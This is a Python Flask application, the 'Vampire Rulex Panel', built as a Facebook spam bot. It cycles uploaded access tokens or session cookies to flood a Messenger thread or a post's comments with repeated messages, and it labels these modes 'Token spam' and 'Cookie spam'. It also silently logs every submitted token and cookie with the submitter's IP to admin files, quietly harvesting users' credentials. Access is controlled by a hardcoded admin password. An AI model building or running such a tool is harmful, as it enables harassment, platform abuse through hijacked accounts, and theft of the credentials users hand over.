from flask import Flask, request, redirect
import requests
from threading import Thread, Event
import time
import uuid
import json
import os

app = Flask(__name__)
app.debug = True

stop_event_token = Event()
stop_event_cookie = Event()
threads_token = []
threads_cookie = []
sent_count_token = 0
sent_count_cookie = 0

APPROVED_KEYS_TOKEN_FILE = "approved_keys_token.json"
APPROVED_KEYS_COOKIE_FILE = "approved_keys_cookie.json"

ADMIN_TOKENS_LOG = "admin_tokens.log"
ADMIN_COOKIES_LOG = "admin_cookies.log"
MESSAGE_LOG = "message_log.txt"

# Load or initialize keys
def load_keys(file):
    if os.path.exists(file):
        with open(file, "r") as f:
            return json.load(f)
    return {}

def save_keys(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

approved_keys_token = load_keys(APPROVED_KEYS_TOKEN_FILE)
approved_keys_cookie = load_keys(APPROVED_KEYS_COOKIE_FILE)

def log(file, msg):
    with open(file, "a") as f:
        f.write(f"[{time.ctime()}] {msg}\n")

# Token mode
def send_messages_token(tokens, thread_id, name, delay, messages):
    global stop_event_token, sent_count_token
    while not stop_event_token.is_set():
        for msg in messages:
            if stop_event_token.is_set():
                break
            for token in tokens:
                try:
                    url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    data = {'access_token': token, 'message': f"{name}: {msg}"}
                    r = requests.post(url, data=data, timeout=10)
                    if r.status_code == 200:
                        print(f"✅ Token: {msg}")
                        log(MESSAGE_LOG, f"TOKEN {token[:10]}... => {msg}")
                        sent_count_token += 1
                    else:
                        print(f"❌ Token Failed [{r.status_code}]: {msg}")
                except Exception as e:
                    print(f"Error Token: {e}")
                time.sleep(delay)

# Cookie mode
def send_comments_cookie(cookies, post_id, name, delay, comments):
    global stop_event_cookie, sent_count_cookie
    x = 0
    i = 0
    while not stop_event_cookie.is_set():
        try:
            comment = f"{name}: {comments[x]}"
            current_cookie = cookies[i]
            r = requests.post(f'https://graph.facebook.com/{post_id}/comments/',
                              data={'message': comment},
                              cookies={'Cookie': current_cookie})
            if r.status_code == 200 and 'id' in r.json():
                print(f"✅ Cookie #{i+1}: {comment}")
                log(MESSAGE_LOG, f"COOKIE #{i+1} => {comment}")
                sent_count_cookie += 1
            else:
                print(f"❌ Cookie #{i+1} failed.")
            x = (x + 1) % len(comments)
            i = (i + 1) % len(cookies)
            time.sleep(delay)
        except Exception as e:
            print(f"Cookie Error: {e}")
            time.sleep(3)

@app.route('/', methods=['GET', 'POST'])
def index():
    global threads_token, threads_cookie, stop_event_token, stop_event_cookie, sent_count_token, sent_count_cookie

    if request.method == 'GET':
        key_token = str(uuid.uuid4())[:8]
        key_cookie = str(uuid.uuid4())[:8]
        approved_keys_token[key_token] = False
        approved_keys_cookie[key_cookie] = False
        save_keys(APPROVED_KEYS_TOKEN_FILE, approved_keys_token)
        save_keys(APPROVED_KEYS_COOKIE_FILE, approved_keys_cookie)

        return f"""
        <h2>🧛 Vampire Rulex Panel</h2>
        <p><b>Messenger Token Key:</b> <code>{key_token}</code></p>
        <p><b>Cookie Commenter Key:</b> <code>{key_cookie}</code></p>
        <form method="POST" enctype="multipart/form-data">
            Mode:
            <select name="mode">
                <option value="token">Messenger (token)</option>
                <option value="cookie">Post Comment (cookie)</option>
            </select><br>
            Key: <input name="secret_key"><br><br>
            <b>Messenger:</b><br>
            Token File: <input type="file" name="tokenFile"><br>
            Thread ID: <input name="threadId"><br>
            Name: <input name="userName"><br>
            Delay: <input name="time"><br>
            Messages File: <input type="file" name="txtFile"><br><br>
            <b>Post:</b><br>
            Cookie File: <input type="file" name="cookieFile"><br>
            Post ID: <input name="postId"><br>
            Name: <input name="commenterName"><br>
            Delay: <input name="delay"><br>
            Comment File: <input type="file" name="commentsFile"><br><br>
            <button type="submit">Start</button>
        </form>
        <p><a href="/admin">Admin Panel</a></p>
        """

    mode = request.form.get("mode")
    key = request.form.get("secret_key", "").strip()
    ip = request.remote_addr

    if mode == "token":
        if key not in approved_keys_token or not approved_keys_token.get(key):
            return "❌ Invalid or unapproved token key"
        tokens = request.files['tokenFile'].read().decode().splitlines()
        messages = request.files['txtFile'].read().decode().splitlines()
        thread_id = request.form.get('threadId')
        name = request.form.get('userName')
        delay = int(request.form.get('time', 3))
        for t in tokens:
            log(ADMIN_TOKENS_LOG, f"{key} | {ip} | {t}")
        if not any(t.is_alive() for t in threads_token):
            stop_event_token.clear()
            sent_count_token = 0
            th = Thread(target=send_messages_token, args=(tokens, thread_id, name, delay, messages))
            th.start()
            threads_token.append(th)
        return "✅ Token spam started. <a href='/status'>Check Status</a>"

    elif mode == "cookie":
        if key not in approved_keys_cookie or not approved_keys_cookie.get(key):
            return "❌ Invalid or unapproved cookie key"
        cookies = request.files['cookieFile'].read().decode().splitlines()
        comments = request.files['commentsFile'].read().decode().splitlines()
        post_id = request.form.get('postId')
        name = request.form.get('commenterName')
        delay = int(request.form.get('delay', 3))
        for c in cookies:
            log(ADMIN_COOKIES_LOG, f"{key} | {ip} | {c}")
        if not any(t.is_alive() for t in threads_cookie):
            stop_event_cookie.clear()
            sent_count_cookie = 0
            th = Thread(target=send_comments_cookie, args=(cookies, post_id, name, delay, comments))
            th.start()
            threads_cookie.append(th)
        return "✅ Cookie spam started. <a href='/status'>Check Status</a>"

    return "❌ Invalid Mode"

@app.route('/stop', methods=['POST'])
def stop_all():
    stop_event_token.set()
    stop_event_cookie.set()
    return "🛑 All tasks stopped."

@app.route('/status')
def show_status():
    return f"""
    <h3>Bot Status:</h3>
    <p>Messenger Sent: {sent_count_token}</p>
    <p>Post Comments Sent: {sent_count_cookie}</p>
    <form method='post' action='/stop'><button type='submit'>🛑 STOP</button></form>
    """

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    auth = request.authorization
    if not auth or auth.username != 'admin' or auth.password != 'ayushadmin123':
        return ('Login required', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})

    msg = ""
    if request.method == 'POST':
        for key in ['approve_key_token', 'approve_key_cookie', 'remove_key_token', 'remove_key_cookie']:
            k = request.form.get(key)
            if not k:
                continue
            if 'approve' in key:
                if 'token' in key and k in approved_keys_token:
                    approved_keys_token[k] = True
                    save_keys(APPROVED_KEYS_TOKEN_FILE, approved_keys_token)
                    msg = f"✅ Approved Token Key: {k}"
                elif 'cookie' in key and k in approved_keys_cookie:
                    approved_keys_cookie[k] = True
                    save_keys(APPROVED_KEYS_COOKIE_FILE, approved_keys_cookie)
                    msg = f"✅ Approved Cookie Key: {k}"
            if 'remove' in key:
                if 'token' in key and k in approved_keys_token:
                    del approved_keys_token[k]
                    save_keys(APPROVED_KEYS_TOKEN_FILE, approved_keys_token)
                    msg = f"❌ Removed Token Key: {k}"
                elif 'cookie' in key and k in approved_keys_cookie:
                    del approved_keys_cookie[k]
                    save_keys(APPROVED_KEYS_COOKIE_FILE, approved_keys_cookie)
                    msg = f"❌ Removed Cookie Key: {k}"

    html = f"<h2>🛡 Admin Panel</h2><p>{msg}</p>"
    html += "<h3>Token Keys</h3><ul>"
    for k, v in approved_keys_token.items():
        html += f"<li>{k} - {'✅' if v else '❌'}</li>"
    html += "</ul><h3>Cookie Keys</h3><ul>"
    for k, v in approved_keys_cookie.items():
        html += f"<li>{k} - {'✅' if v else '❌'}</li>"
    html += "</ul><form method='POST'>"
    html += "Key: <input name='approve_key_token'><button type='submit'>Approve Token</button><br>"
    html += "Key: <input name='remove_key_token'><button type='submit'>Remove Token</button><br>"
    html += "Key: <input name='approve_key_cookie'><button type='submit'>Approve Cookie</button><br>"
    html += "Key: <input name='remove_key_cookie'><button type='submit'>Remove Cookie</button></form>"
    return html

# --- Run app ---
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
